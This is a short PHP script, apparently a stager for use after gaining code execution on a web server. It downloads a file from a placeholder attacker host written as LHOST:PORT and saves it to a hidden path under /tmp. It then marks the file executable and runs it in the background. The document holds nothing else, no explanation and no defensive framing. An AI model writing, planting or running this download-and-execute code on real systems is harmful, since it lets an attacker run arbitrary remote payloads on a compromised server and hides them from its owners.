<?php

$url = "http://LHOST:PORT/payload";
$path = "/tmp/.s";
file_put_contents($path, file_get_contents($url));
chmod($path, 0755);
exec($path . " &");
